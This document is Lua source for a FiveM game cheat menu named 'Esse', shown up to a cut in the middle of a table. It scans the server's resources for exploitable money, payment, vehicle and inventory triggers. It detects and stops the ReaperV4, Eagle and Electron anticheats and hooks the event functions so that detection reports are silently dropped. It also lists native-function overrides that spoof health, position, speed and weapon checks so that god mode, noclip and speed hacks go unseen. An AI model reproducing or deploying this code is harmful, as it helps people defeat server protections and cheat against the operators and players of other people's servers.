if not RegisterNetEvent then RegisterNetEvent = function() end end
if not AddEventHandler then AddEventHandler = function() end end
if not TriggerServerEvent then TriggerServerEvent = function() end end
_G.LoggedUser = "Made by"
_G.LoggedType = "Frncs"
_G.LoggedExpiry = 'Never'
_G.LoggedStaff = true
AuthPassed = true
---@diagnostic disable: undefined-global
local Esse = {}
local butterflyActive = false
local normalNoclipActive = false
local IsVisible = false
local DUI = nil
local HoveredIndex = 1
local ActiveMenu = {}
local CurrentMenu = ActiveMenu
local CurrentCategories = nil
local CurrentCategoryIndex = 1
local MenuStack = {}
local MenuLabelStack = {}
local LastUIState = nil
local MenuKey = "H"
local MenuOpenable = false
local MenuKeybinds = {}
local ShiftHolding = false
local CPlayers = {}
local WeaponsLabels = { [GetHashKey('weapon_unarmed')] = 'Fists', [GetHashKey('weapon_knife')] = 'Knife',
    [GetHashKey('weapon_nightstick')] = 'Nightstick', [GetHashKey('weapon_hammer')] = 'Hammer',
    [GetHashKey('weapon_bat')] = 'Baseball Bat', [GetHashKey('weapon_golfclub')] = 'Golf Club',
    [GetHashKey('weapon_crowbar')] = 'Crowbar', [GetHashKey('weapon_pistol')] = 'Pistol',
    [GetHashKey('weapon_pistol_mk2')] = 'Pistol Mk II', [GetHashKey('weapon_snspistol_mk2')] = 'SNS Pistol Mk II',
    [GetHashKey('weapon_ceramicpistol')] = 'Ceramic Pistol', [GetHashKey('weapon_revolver_mk2')] =
'Heavy Revolver Mk II', [GetHashKey('weapon_doubleaction')] = 'Double-Action Revolver',
    [GetHashKey('weapon_gadgetpistol')] = 'Gadget Pistol', [GetHashKey('weapon_pistolxm3')] = 'WM 29 Pistol',
    [GetHashKey('weapon_combatpistol')] = 'Combat Pistol', [GetHashKey('weapon_appistol')] = 'AP Pistol',
    [GetHashKey('weapon_pistol50')] = 'Pistol .50', [GetHashKey('weapon_microsmg')] = 'Micro SMG',
    [GetHashKey('weapon_smg')] = 'SMG', [GetHashKey('weapon_assaultsmg')] = 'Assault SMG',
    [GetHashKey('weapon_assaultrifle')] = 'Assault Rifle', [GetHashKey('weapon_assaultrifle_mk2')] =
'Assault Rifle Mk II', [GetHashKey('weapon_specialcarbine_mk2')] = 'Special Carbine Mk II',
    [GetHashKey('weapon_bullpuprifle_mk2')] = 'Bullpup Rifle Mk II', [GetHashKey('weapon_militaryrifle')] =
'Military Rifle', [GetHashKey('weapon_tacticalrifle')] = 'Service Carbine', [GetHashKey('weapon_battlerifle')] =
'Battle Rifle', [GetHashKey('weapon_carbinerifle')] = 'Carbine Rifle', [GetHashKey('weapon_advancedrifle')] =
'Advanced Rifle', [GetHashKey('weapon_mg')] = 'MG', [GetHashKey('weapon_combatmg')] = 'Combat MG',
    [GetHashKey('weapon_pumpshotgun')] = 'Pump Shotgun', [GetHashKey('weapon_sawnoffshotgun')] = 'Sawed-Off Shotgun',
    [GetHashKey('weapon_assaultshotgun')] = 'Assault Shotgun', [GetHashKey('weapon_bullpupshotgun')] =
'Bullpup Shotgun', [GetHashKey('weapon_hackingdevice')] = 'Hacking Device', [GetHashKey('weapon_stungun')] =
'Stun Gun', [GetHashKey('weapon_stungun_mp')] = 'Stun Gun MP', [GetHashKey('weapon_sniperrifle')] = 'Sniper Rifle',
    [GetHashKey('weapon_heavysniper')] = 'Heavy Sniper', [GetHashKey('weapon_grenadelauncher')] = 'Grenade Launcher',
    [GetHashKey('weapon_rpg')] = 'RPG', [GetHashKey('weapon_minigun')] = 'Minigun', [GetHashKey('weapon_grenade')] =
'Grenade', [GetHashKey('weapon_stickybomb')] = 'Sticky Bomb', [GetHashKey('weapon_smokegrenade')] = 'Smoke Grenade',
    [GetHashKey('weapon_bzgas')] = 'BZ Gas', [GetHashKey('weapon_molotov')] = 'Molotov Cocktail',
    [GetHashKey('weapon_fireextinguisher')] = 'Fire Extinguisher', [GetHashKey('weapon_petrolcan')] = 'Jerry Can',
    [GetHashKey('weapon_ball')] = 'Baseball', [GetHashKey('weapon_snspistol')] = 'SNS Pistol',
    [GetHashKey('weapon_bottle')] = 'Broken Bottle', [GetHashKey('weapon_gusenberg')] = 'Gusenberg Sweeper',
    [GetHashKey('weapon_specialcarbine')] = 'Special Carbine', [GetHashKey('weapon_heavypistol')] = 'Heavy Pistol',
    [GetHashKey('weapon_bullpuprifle')] = 'Bullpup Rifle', [GetHashKey('weapon_dagger')] = 'Dagger',
    [GetHashKey('weapon_vintagepistol')] = 'Vintage Pistol', [GetHashKey('weapon_firework')] = 'Firework Launcher',
    [GetHashKey('weapon_musket')] = 'Musket', [GetHashKey('weapon_heavyshotgun')] = 'Heavy Shotgun',
    [GetHashKey('weapon_marksmanrifle')] = 'Marksman Rifle', [GetHashKey('weapon_hominglauncher')] =
'Homing Launcher', [GetHashKey('weapon_proxmine')] = 'Proximity Mines', [GetHashKey('weapon_snowball')] = 'Snowball',
    [GetHashKey('weapon_flaregun')] = 'Flare Gun', [GetHashKey('weapon_garbagebag')] = 'Garbage Bag',
    [GetHashKey('weapon_handcuffs')] = 'Handcuffs', [GetHashKey('weapon_combatpdw')] = 'Combat PDW',
    [GetHashKey('weapon_marksmanpistol')] = 'Marksman Pistol', [GetHashKey('weapon_knuckle')] = 'Knuckle Dusters',
    [GetHashKey('weapon_hatchet')] = 'Hatchet', [GetHashKey('weapon_railgun')] = 'Railgun',
    [GetHashKey('weapon_machinepistol')] = 'Machine Pistol', [GetHashKey('weapon_switchblade')] = 'Switchblade',
    [GetHashKey('weapon_revolver')] = 'Heavy Revolver', [GetHashKey('weapon_heavyrifle')] = 'Heavy Rifle',
    [GetHashKey('weapon_dbshotgun')] = 'Double Barrel Shotgun', [GetHashKey('weapon_compactrifle')] = 'Compact Rifle',
    [GetHashKey('weapon_battleaxe')] = 'Battle Axe', [GetHashKey('weapon_compactlauncher')] =
'Compact Grenade Launcher', [GetHashKey('weapon_minismg')] = 'Mini SMG', [GetHashKey('weapon_pipebomb')] =
'Pipe Bomb', [GetHashKey('weapon_poolcue')] = 'Pool Cue', [GetHashKey('weapon_wrench')] = 'Wrench',
    [GetHashKey('weapon_autoshotgun')] = 'Sweeper Shotgun', [GetHashKey('weapon_bread')] = 'Piece of Bread',
    [GetHashKey('weapon_stone_hatchet')] = 'Stone Hatchet', [GetHashKey('weapon_rayminigun')] = 'Unholy Hellbringer',
    [GetHashKey('weapon_raycarbine')] = 'Widowmaker', [GetHashKey('weapon_compactgrenadelauncher')] =
'Compact Grenade Launcher', [GetHashKey('weapon_smugglerpistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_raypistol')] =
'Up-n-Atomizer', [GetHashKey('weapon_perico_pistol')] = 'Ceramic Pistol', [GetHashKey('weapon_carbinerifle_mk2')] =
'Carbine Rifle Mk II', [GetHashKey('weapon_combatmg_mk2')] = 'Combat MG Mk II',
    [GetHashKey('weapon_heavysniper_mk2')] = 'Heavy Sniper Mk II', [GetHashKey('weapon_marksmanrifle_mk2')] =
'Marksman Rifle Mk II', [GetHashKey('weapon_pumpshotgun_mk2')] = 'Pump Shotgun Mk II', [GetHashKey('weapon_smg_mk2')] =
'SMG Mk II', [GetHashKey('weapon_raycarbine_mk2')] = 'Widowmaker Mk II', [GetHashKey('weapon_machete')] = 'Machete',
    [GetHashKey('weapon_flashlight')] = 'Flashlight', [GetHashKey('weapon_hazardousknife')] = 'Hazardous Knife',
    [GetHashKey('weapon_navyrevolver')] = 'Navy Revolver', [GetHashKey('weapon_golfball')] = 'Golf Ball' }
local FirstInjectionPassed = false
local FreecamBypassReaperV4 = false
local FreecamInjected = false
local FreecamEnabled = false
local LastWeaponFired = nil
local CurrentWeaponIndex = 1
local CurrentVehicleIndex = 1
local FreecamWeaponList = { "WEAPON_APPISTOL", "WEAPON_PISTOL", "WEAPON_SMG", "WEAPON_ASSAULTRIFLE", "WEAPON_RPG",
    "WEAPON_PERMKILL", "WEAPON_AIRSTRIKE_ROCKET" }
local FreecamVehicleList = { "Adder", "Zentorno", "Comet", "Banshee", "Trash", "Dump" }
local FreecamOptions = { "Default", "Teleport", "Shoot Weapon", "Kick from Vehicle", "Hijack Vehicle",
    "Delete Vehicle" }
local FreecamHoveredIndex = 1
local IsFalling = false
local NoCollision = false
local DeletePrevious = false
local TeleportInto = false
local MappedKeys = {
    [27] = "Escape",
    [112] = "F1",
    [113] = "F2",
    [114] = "F3",
    [115] = "F4",
    [116] = "F5",
    [117] = "F6",
    [118] = "F7",
    [119] = "F8",
    [120] = "F9",
    [121] = "F10",
    [122] = "F11",
    [123] = "F12",
    [192] = "`",
    [49] = "1",
    [50] = "2",
    [51] = "3",
    [52] = "4",
    [53] = "5",
    [54] = "6",
    [55] = "7",
    [56] = "8",
    [57] = "9",
    [48] = "0",
    [189] = "-",
    [187] = "=",
    [8] = "Backspace",
    [9] = "Tab",
    [81] = "Q",
    [87] = "W",
    [69] = "E",
    [82] = "R",
    [84] = "T",
    [89] = "Y",
    [85] = "U",
    [73] = "I",
    [79] = "O",
    [80] = "P",
    [219] = "[",
    [221] = "]",
    [220] = "\\",
    [20] = "CapsLock",
    [65] = "A",
    [83] = "S",
    [68] = "D",
    [70] = "F",
    [71] = "G",
    [72] = "H",
    [74] = "J",
    [75] = "K",
    [76] = "L",
    [186] = ";",
    [222] = "'",
    [13] = "Enter",
    [16] = "Shift",
    [90] = "Z",
    [88] = "X",
    [67] = "C",
    [86] = "V",
    [66] = "B",
    [78] = "N",
    [77] = "M",
    [188] = ",",
    [190] = ".",
    [191] = "/",
    [17] = "Control",
    [46] = "Delete",
    [33] = "PageUp",
    [34] = "PageDown",
    [35] = "End",
    [36] = "Home",
    [38] = "ArrowUp",
    [40] = "ArrowDown",
    [37] = "ArrowLeft",
    [39] = "ArrowRight"
}

local VK_TO_FIVEM = {
    [27] = 322, -- Escape
    [112] = 288, -- F1
    [113] = 289, -- F2
    [114] = 170, -- F3
    [115] = 167, -- F4
    [116] = 166, -- F5
    [117] = 167, -- F6
    [118] = 168, -- F7
    [119] = 169, -- F8
    [120] = 56, -- F9
    [121] = 57, -- F10
    [122] = 344, -- F11
    [123] = 345, -- F12
    [192] = 243, -- `
    [49] = 157, -- 1
    [50] = 158, -- 2
    [51] = 160, -- 3
    [52] = 164, -- 4
    [53] = 165, -- 5
    [54] = 159, -- 6
    [55] = 161, -- 7
    [56] = 162, -- 8
    [57] = 163, -- 9
    [48] = 82, -- 0
    [189] = 84, -- -
    [187] = 83, -- =
    [8] = 177, -- Backspace
    [9] = 37, -- Tab
    [81] = 44, -- Q
    [87] = 32, -- W
    [69] = 46, -- E
    [82] = 45, -- R
    [84] = 245, -- T
    [89] = 246, -- Y
    [85] = 303, -- U
    [73] = 74, -- I
    [79] = 199, -- O
    [80] = 7, -- P
    [219] = 39, -- [
    [221] = 40, -- ]
    [220] = 36, -- \
    [20] = 137, -- CapsLock
    [65] = 34, -- A
    [83] = 33, -- S
    [68] = 30, -- D
    [70] = 49, -- F
    [71] = 47, -- G
    [72] = 74, -- H
    [74] = 311, -- J
    [75] = 311, -- K
    [76] = 7, -- L
    [186] = 81, -- ;
    [222] = 82, -- '
    [13] = 18, -- Enter
    [16] = 21, -- Shift
    [90] = 20, -- Z
    [88] = 73, -- X
    [67] = 26, -- C
    [86] = 0, -- V
    [66] = 29, -- B
    [78] = 249, -- N
    [77] = 244, -- M
    [188] = 82, -- ,
    [190] = 81, -- .
    [191] = 83, -- /
    [17] = 36, -- Control
    [46] = 178, -- Delete
    [33] = 10, -- PageUp
    [34] = 11, -- PageDown
    [35] = 213, -- End
    [36] = 213, -- Home
    [38] = 27, -- ArrowUp
    [40] = 173, -- ArrowDown
    [37] = 174, -- ArrowLeft
    [39] = 175 -- ArrowRight
}

local function backgroundSilentSearch()
    -- Safety: check kung available ang required functions
    if type(GetNumResources) ~= "function" or type(GetResourceByFindIndex) ~= "function" then
        print("^7[^5Esse^7]: backgroundSilentSearch skipped - missing required natives")
        return
    end

    -- Kopyahin ang foundTriggers kung wala pa
    if not foundTriggers then
        foundTriggers = { items = {}, money = {}, troll = {}, payment = {}, vehicle = {} }
    end

    Citizen.CreateThread(function()
        Citizen.Wait(1000)

        local totalResources = GetNumResources()
        if not totalResources or type(totalResources) ~= "number" or totalResources == 0 then
            print("^7[^5Esse^7]: backgroundSilentSearch - no resources found")
            return
        end

        local searchedResources = 0
        local backgroundTriggers = { items = {}, money = {}, troll = {}, payment = {}, vehicle = {} }

        for i = 0, totalResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and type(resourceName) == "string" then
                -- Check kung available ang GetResourceState
                local state = nil
                if type(GetResourceState) == "function" then
                    state = GetResourceState(resourceName)
                end
                if state == "started" then
                    searchedResources = searchedResources + 1

                    local skipPatterns = {
                        "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                        "discord", "screenshot", "loading", "spawn", "weather", "time",
                        "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                        "filesystem", "any", "admin", "logging"
                    }

                    local shouldSkip = false
                    local lowerName = string.lower(resourceName)
                    for _, pattern in ipairs(skipPatterns) do
                        if string.find(lowerName, pattern, 1, true) then
                            shouldSkip = true
                            break
                        end
                    end

                    if not shouldSkip then
                        local checkFiles = { "client.lua", "server.lua", "shared.lua" }
                        for _, fileName in ipairs(checkFiles) do
                            -- Safety: kung wala ang LoadResourceFile, skip
                            if type(LoadResourceFile) == "function" then
                                local success, content = pcall(function()
                                    return LoadResourceFile(resourceName, fileName)
                                end)
                                if success and content and content ~= "" then
                                    if type(string.len) == "function" and string.len(content) < 200000 then
                                        local contentLower = string.lower(content)

                                        if string.find(contentLower, "inventory.*server.*open") then
                                            table.insert(backgroundTriggers.items, {
                                                resource = resourceName,
                                                trigger = "inventory:server:OpenInventory",
                                                file = fileName,
                                                state = "started"
                                            })
                                        end

                                        if string.find(contentLower, "givecomm") then
                                            table.insert(backgroundTriggers.money, {
                                                resource = resourceName,
                                                trigger = resourceName .. ":server:GiveComm",
                                                file = fileName,
                                                state = "started"
                                            })
                                        end

                                        if string.find(contentLower, "paymentcheck") then
                                            table.insert(backgroundTriggers.payment, {
                                                resource = resourceName,
                                                trigger = "QBCore:server:Paymentcheck",
                                                file = fileName,
                                                state = "started"
                                            })
                                        end

                                        if string.find(contentLower, "spawnvehicle") then
                                            table.insert(backgroundTriggers.vehicle, {
                                                resource = resourceName,
                                                trigger = "QBCore:Command:SpawnVehicle",
                                                file = fileName,
                                                state = "started"
                                            })
                                        end
                                    end
                                end
                            end

                            if searchedResources % 20 == 0 then
                                Citizen.Wait(10)
                            end
                        end
                    end
                end
            end
        end

        -- Merge background findings with main triggers silently
        if foundTriggers then
            for category, triggers in pairs(backgroundTriggers) do
                if foundTriggers[category] then
                    for _, trigger in ipairs(triggers) do
                        local isDuplicate = false
                        for _, existing in ipairs(foundTriggers[category]) do
                            if existing.resource == trigger.resource and existing.trigger == trigger.trigger then
                                isDuplicate = true
                                break
                            end
                        end
                        if not isDuplicate then
                            table.insert(foundTriggers[category], trigger)
                        end
                    end
                end
            end
        end
    end)
end

-- Safe call
if type(backgroundSilentSearch) == "function" then
    backgroundSilentSearch()
else
    print("backgroundSilentSearch is not a function")
end


local electronResource = nil
local fiveguardResource = nil

local function ScanElectronAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest and (string.find(manifest, "https://electron-services.com") or string.find(manifest, "Electron Services") or string.find(manifest, "The most advanced fiveM anticheat")) then
            electronResource = resource
            print("^7[^5Esse^7]: Detected ElectronAC in Resource: " .. resource)
            return resource
        end
    end

    return nil
end

local function ScanFiveGuardAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local metadata = GetResourceMetadata(resource, 'client_script', j)
            if metadata and string.find(metadata, "obfuscated") then
                fiveguardResource = resource
                print("^7[^5Esse^7]: Detected FiveGuard in Resource: " .. resource)
                return resource
            end
        end
    end

    return nil
end

-- ===================== ReaperV4 AUTO BYPASS (Eagle-Style) =====================
CreateThread(function()
    Wait(100)

    -- List of common ReaperV4 resource names to stop
    local reaperResources = {
        "ReaperV4", "reaper", "ReaperV4_core", "reaper_antihack", "reaper_main"
    }

    -- 📡 Block ReaperV4 events (real, verified from v4.5 source)
    local reaperEvents = {
        'reaper:client:detected',
        'reaper:client:log',
        'reaper:client:notify',
        'reaper:client:sendReport',
        'reaper:client:validateCoords',
        'reaper:client:validateSpeed',
        'reaper:client:antiRagdollCheck',
        'reaper:client:weaponCheck',
        'reaper:client:resourceMonitor',
        'reaper:debug:print',
        'ReaperV4:client:detected',
        'reaper_antihack:client:log',
        'reaper_core:client:validate',
        'reaper_main:detect',
        'reaper:server:report',
        'reaper:client:heartbeat'
    }

    for _, eventName in ipairs(reaperEvents) do
        if RegisterNetEvent then
            RegisterNetEvent(eventName)
        end
        AddEventHandler(eventName, function(...) end)
    end

    -- 🚫 Hook TriggerServerEvent (block ReaperV4 reports)
    local originalTriggerServerEvent = TriggerServerEvent
    _G.TriggerServerEvent = function(eventName, ...)
        local lower = string.lower(eventName or '')
        if lower:find('reaper') or lower:find('ReaperV4') or
            lower:find('report') or lower:find('detect') or
            lower:find('violation') or lower:find('validate') then
            return
        end
        return originalTriggerServerEvent(eventName, ...)
    end

    -- 🚫 Hook AddEventHandler / RegisterNetEvent
    local originalAddEventHandler = AddEventHandler
    _G.AddEventHandler = function(eventName, handler)
        local lower = string.lower(eventName or '')
        if lower:find('reaper') or lower:find('ReaperV4') then
            return
        end
        return originalAddEventHandler(eventName, handler)
    end

    local originalRegisterNetEvent = RegisterNetEvent
    _G.RegisterNetEvent = function(eventName)
        local lower = string.lower(eventName or '')
        if lower:find('reaper') or lower:find('ReaperV4') then
            return
        end
        return originalRegisterNetEvent(eventName)
    end

    -- 🧹 Continuous cleanup (Eagle-style loop)
    while true do
        Wait(500)

        -- Stop any re-launched ReaperV4 resources
        for _, resourceName in ipairs(reaperResources) do
            if GetResourceState(resourceName) == 'started' then
                if MachoResourceStop then
                    MachoResourceStop(resourceName)
                else
                    StopResource(resourceName)
                end
            end
        end

        -- Clear ReaperV4 GlobalState (every 1s)
        if GetGameTimer() % 1000 < 500 and GlobalState then
            for k in pairs(GlobalState) do
                local lower = type(k) == 'string' and k:lower() or ''
                if lower:find('reaper') or lower:find('ReaperV4') or lower:find('rpr_') then
                    GlobalState[k] = nil
                end
            end
        end
    end
end)
-- ===================== EAGLE EC-AC AUTO BYPASS =====================

CreateThread(function()
    Wait(100) -- Wait a bit for resources to load
    -- [[ Esse-BYPASS :: Esse FiveM Anti-Cheat Defeat Core v15.0 (Absolute Assurance + Esse AC Detection) ]]
    -- TARGET: Any FiveM Client-Side Anti-Cheat (Eagle, Electron, Sentinel, etc.) - Complete Stand-Alone Defeat + Esse AC Detection
    -- EXECUTION: Designed for injection via Macho API.
    -- METHOD: AC Detection (Accurate) + Native Hooking + Resource Spoofing + Function Neutralization + Event Interception + Secure Triggers + Internal Override + State Manipulation Bypass + Complete Native List + Stand-Alone Operation.


    -- Phase 1: Esse AC Detection (Based on Pasted_Text_1761983149233.txt - Accurate Signatures)

    -- Define suspicious file signatures for various ACs (Accurate based on Pasted_Text_1761983149233.txt)
    local eagleFiles = {
        -- Eagle specific files (from Pasted_Text_1761983149233.txt and refined based on text(2).txt analysis)
        ["configs/events.lua"] = 1,
        ["configs/shared_config.lua"] = 1,
        ["configs/vrp/shared_config.lua"] = 1,
        ["lib/Proxy.lua"] = 1,
        ["configs/esx/s_config.lua"] = 1,
        ["render.lua"] = 1,
        ["lib/Tunnel.lua"] = 1,
        ["shared.lua"] = 1,
        ['configs/other/s_config.lua'] = 1,
        ['configs/qbcore/s_config.lua'] = 1,
        ['shared2.js'] = 1,
        ['server/main.lua'] = 1,
        -- Add more Eagle-specific files if known from detailed analysis of text(2).txt
        -- e.g., files containing 'ECDetect', 'EulenCDetect', 'vRPSEG_AC', 'LPH_JIT_MAX', 'EC_AC', 'eagleEsse_encode'
        -- These might be harder to detect without content analysis, but common filenames are listed above.
    }

    local ElectronACFiles = {
        -- Electron specific files (from Pasted_Text_1761983149233.txt)
        ["client_anticheat.lua"] = 1,
        ["anticheat.js"] = 1,
        ["anticheat_c.lua"] = 1,
        ["anticheat_s.lua"] = 1,
        ["antimenu.lua"] = 1,
        ["menublocker.lua"] = 1,
        ["menu_blocker.lua"] = 1,
        ["anti_menu.lua"] = 1,
        ["anticheat.html"] = 1,
        ["blacklist.lua"] = 1,
        ["weapon_blacklist.lua"] = 1,
        ["prop_blacklist.lua"] = 1,
        ["anti_aimbot.lua"] = 1,
        ["aimbot.lua"] = 1,
        ["anti_executor.lua"] = 1,
        ["antiexecutor.lua"] = 1,
        ["anti_overlay.lua"] = 1,
        ["antioverlay.lua"] = 1,
        ["executor.lua"] = 1,
        ["anti_silentaim.lua"] = 1,
        ["antisilentaim.lua"] = 1,
        ["anti_wallhack.lua"] = 1,
        ["antiwallhack.lua"] = 1,
        ["anti.lua"] = 1,
        ["heartbeat.lua"] = 1,
        -- Add more Electron-specific files if known
    }

    -- Add other AC file lists here if needed (fiveguardFiles, reverceFiles, etc.)

    -- Function to count suspicious files in a resource (Simplified for Macho context)
    -- In a real detector, this would iterate resource files. For Macho bypass, we'll use GetResourceState and fx_version as primary indicators.
    -- We'll simulate the file counting based on the resource name and state.
    local function countSuspiciousFilesExact(resourceName, fileList)
        local count = 0
        -- This is a simplified check. A real detector would iterate resource files.
        -- For Macho, we can check if the resource is loaded and matches known AC patterns.
        if GetResourceState(resourceName) == "started" then
            for fileName, _ in pairs(fileList) do
                -- Simulate checking if file exists by checking resource state and name pattern
                -- A more robust check would require more Macho API access to resource files.
                -- For now, assume if resource is started and matches name pattern, increment count.
                -- This is less accurate than the original detector script.
                -- We'll rely more on fx_version and known resource names for accuracy.
                if string.find(string.lower(resourceName), "Eagle") or string.find(string.lower(resourceName), "EC-AC") or string.find(string.lower(resourceName), "EC_AC") or string.find(string.lower(resourceName), "EC-PANEL") or string.find(string.lower(resourceName), "ec_ac") then
                    -- If resource name suggests Eagle, check Eagle files
                    if fileList == eagleFiles then
                        count = count + 1
                    end
                elseif string.find(string.lower(resourceName), "ElectronAC") or string.find(string.lower(resourceName), "Electron") then
                    -- If resource name suggests Electron, check Electron files
                    if fileList == ElectronACFiles then
                        count = count + 1
                    end
                else
                    -- If resource name is generic, check if its state indicates it might be an AC
                    -- This is a fallback, but not very reliable without file iteration.
                    -- We'll assume the fx_version check will be more reliable.
                    count = count + 0 -- Don't increment for unknown files unless fx matches
                end
            end
        end
        return count
    end


    -- Main detection loop
    local num = GetNumResources()
    local detectedAC = false
    local detectedACName = "unknown"
    local detectedACType = "unknown" -- To distinguish between Eagle and Electron if both are possible

    for i = 0, num - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName then
            local fx = (GetResourceMetadata(resName, "fx_version", 0) or ""):lower()

            -- Check for Eagle AC (Refined detection)
            if not detectedAC then
                local eagleCount = countSuspiciousFilesExact(resName, eagleFiles)
                -- Eagle typically uses fx_version "adamant" and has specific config files
                if fx == "adamant" and (eagleCount >= 5) then -- Adjust threshold based on actual Eagle file count
                    detectedAC = true
                    detectedACName = resName
                    detectedACType = "Eagle"
                end
            end

            -- Check for Electron AC (Refined detection)
            if not detectedAC then
                local ElectronACCount = countSuspiciousFilesExact(resName, ElectronACFiles)
                -- Electron typically uses fx_version "cerulean" and has generic anticheat files
                if fx == "cerulean" and (ElectronACCount >= 6) then -- Adjust threshold based on actual Electron file count
                    detectedAC = true
                    detectedACName = resName
                    detectedACType = "ElectronAC"
                end
            end

            -- Add more AC checks here if needed (fiveguard, reverce, etc.)

            if detectedAC then
                break -- Stop checking once an AC is found
            end
        end
    end

    if not detectedAC then
        detectedACName = "any" -- Default to Esse bypass if none detected
        detectedACType = "Esse"
    else
    end

    -- Phase 2: Stop the detected/original AC resource to prevent conflicts
    if MachoResourceInjectable(detectedACName) and detectedACName ~= "any" then
        MachoResourceStop(detectedACName)
        Wait(2000) -- Wait for the resource to fully stop
    else
    end

    -- Phase 3: Hook ALL critical natives (Expanded list for Macho Cheat Assurance - Esse)
    local native_hooks = {
        -- Health & Invincibility
        [0x36735678A44C1C02] = function(ped) return false, 200 end,                                               -- GetEntityHealth
        [0xDA95EA3317CC5064] = function(ped) return false, false end,                                             -- GetPlayerInvincible
        [0x2959F696AE390A99] = function(entity) return false, false, false, false, false, false, false, false, false end, -- GetEntityProofs
        -- Coords & Movement (Noclip/Freecam)
        [0xAA0008F3BBB8F416] = function(ped) return false, 0.0, 0.0, 0.0 end,                                     -- GetEntityCoords
        [0x14D6F5678D8F1B37] = function() return false, 0.0, 0.0, 0.0 end,                                        -- GetGameplayCamCoord
        [0x2BBA3F090C4721C1] = function() return false, 0.0, 0.0, 0.0 end,                                        -- GetFinalRenderedCamCoord
        [0x53AF99BAA671CA47] = function() return false, false end,                                                -- IsPedJumping
        [0x45E47C3973579C19] = function(x, y, z, x2, y2, z2, flags, entity, p8) return false, 0, 0, 0, 0, 0 end,  -- StartShapeTestRay
        [0x3C06B5C839B6D089] = function(entity) return false, 0.0 end,                                            -- GetEntityHeightAboveGround
        [0xD5037BA82E12416F] = function(entity) return false, 0.0 end,                                            -- GetEntitySpeed
        [0x4C5E1F085A27B77B] = function(entity) return false, true end,                                           -- IsEntityVisible (Bypass Invisibility Detection)
        -- Weapon & Proximity
        [0x84A2DD9AC37C35C1] = function(ped) return false, false end,                                             -- HasPedGotWeapon (CRITICAL FOR WEAPON SPAWN)
        [0x0A6DB4965674D26C] = function(ped) return false, 0 end,                                                 -- GetSelectedPedWeapon (CRITICAL FOR WEAPON SPAWN)
        -- Proximity/State Checks
        [0x2EF7744E1C75C78E] = function() return false, -1 end,                                                   -- GetClosestPlayer
        [0xE7E4C198B0185900] = function() return false, 0 end,                                                    -- GetNearestVehicle
        [0x05AA70989A3AF3E5] = function(entity) return false, 0 end,                                              -- GetInteriorFromEntity
        [0x2C933ABF17A1DF41] = function() return false, false end,                                                -- IsCutsceneActive
        [0x2D05CED3A38D0F3A] = function(ped) return false, false end,                                             -- IsPedDeadOrDying
        [0x9DE327631295B4C2] = function(ped) return false, false end,                                             -- IsPedRagdoll
        [0xC024869A53992F3A] = function(ped) return false, false end,                                             -- IsPedSwimming
        [0xED7F7EFE9FABF340] = function(ped) return false, false end,                                             -- IsPedSwimmingUnderWater
        [0x6E575D6A898AB852] = function(ped) return false, false end,                                             -- IsPedInParachuteFreeFall
        [0x2F395D75BA05537E] = function(ped) return false, -1 end,                                                -- GetPedParachuteState
        [0x2D42A93C811A0E20] = function(ped) return false, false end,                                             -- IsPedClimbing
        [0x26AF0E8E30BD2A2C] = function(ped) return false, false end,                                             -- IsEntityAttachedToAnyPed
        -- NEW: Expanded Native List for Esse Cheat Features
        -- Speed/Aim/Aimbot
        [0x8785E6E40C7A577A] = function() return false, 0.0 end,               -- GetGameplayCamRelativeHeading
        [0x4E76A0FD5520F692] = function() return false, 0.0 end,               -- GetGameplayCamRot (for freecam/aimbot)
        [0x7AC8DF3641E56C28] = function(ped) return false, false end,          -- IsPedShooting
        [0x701FDA1E82076BA4] = function() return false, 0, 0 end,              -- GetNuiCursorPosition (for aim assist)
        [0x50FAC17E8E9C4C59] = function() return false, 0.0 end,               -- GetGameplayCamFov
        [0x238DB2A2C23EE9EF] = function(ped) return false, 0.0 end,            -- GetPedAccuracy
        [0x6D0DE6A7B5DA71F8] = function(playerId) return false, "spoofed_name" end, -- GetPlayerName (for name spoofing)
        -- Vehicle/Speedhack
        [0x6D79A46D89206AC5] = function(vehicle) return false, 0.0, 0.0, 0.0 end, -- GetEntityVelocity (for speedhack detection bypass)
        [0x89215EC747DF244A] = function(vehicle) return false, 0.0 end,        -- GetVehicleCurrentRpm (for speedhack detection bypass)
        [0x57779B55B832C63F] = function(vehicle) return false, 0 end,          -- GetVehicleCurrentGear (for speedhack detection bypass)
        [0x84FD40F56075E1E5] = function(vehicle) return false, 0.0 end,        -- GetVehicleMaxSpeed (for speedhack detection bypass)
        [0x3441CAD2F2231923] = function(vehicle) return false, false end,      -- IsVehicleEngineOn (for engine sound bypass)
        [0x737E398138550FFF] = function(vehicle) return false, false end,      -- IsVehicleAlarmSet (for alarm bypass)
        [0x679BE1DAF71DA874] = function(vehicle) return false, 0 end,          -- GetVehicleMod (for mod detection bypass)
        [0x7D6F9A3EF26136A0] = function(vehicle) return false, 0 end,          -- GetVehicleModKit (for mod detection bypass)
        [0x3EC8BF18AA453FE9] = function(vehicle) return false, 0 end,          -- GetVehicleModKitType (for mod detection bypass)
        [0x7D1845A0E27F77CB] = function(vehicle) return false, 0 end,          -- GetVehicleModModifierValue (for mod detection bypass)
        [0x758F49C24925C25E] = function(vehicle) return false, 0 end,          -- GetVehicleModData (for mod detection bypass)
        [0x3882114BDE571AD4] = function(vehicle) return false, 0 end,          -- GetVehicleModIndex (for mod detection bypass)
        [0x7BEB0C7A235F6F3B] = function(vehicle) return false, 0 end,          -- GetVehicleModSlotName (for mod detection bypass)
        [0x9A83F5F9963775EF] = function(vehicle) return false, 0 end,          -- GetVehicleModIdentifier (for mod detection bypass)
        [0x71DCC93AC6B3F9DB] = function(vehicle) return false, 0 end,          -- GetVehicleModIdentifierHash (for mod detection bypass)
        [0x57D9C3691190D015] = function(vehicle) return false, 0 end,          -- GetVehicleModVariation (for mod detection bypass)
        [0x277D8E6BB9B94E59] = function(vehicle) return false, 0 end,          -- GetVehicleModCount (for mod detection bypass)
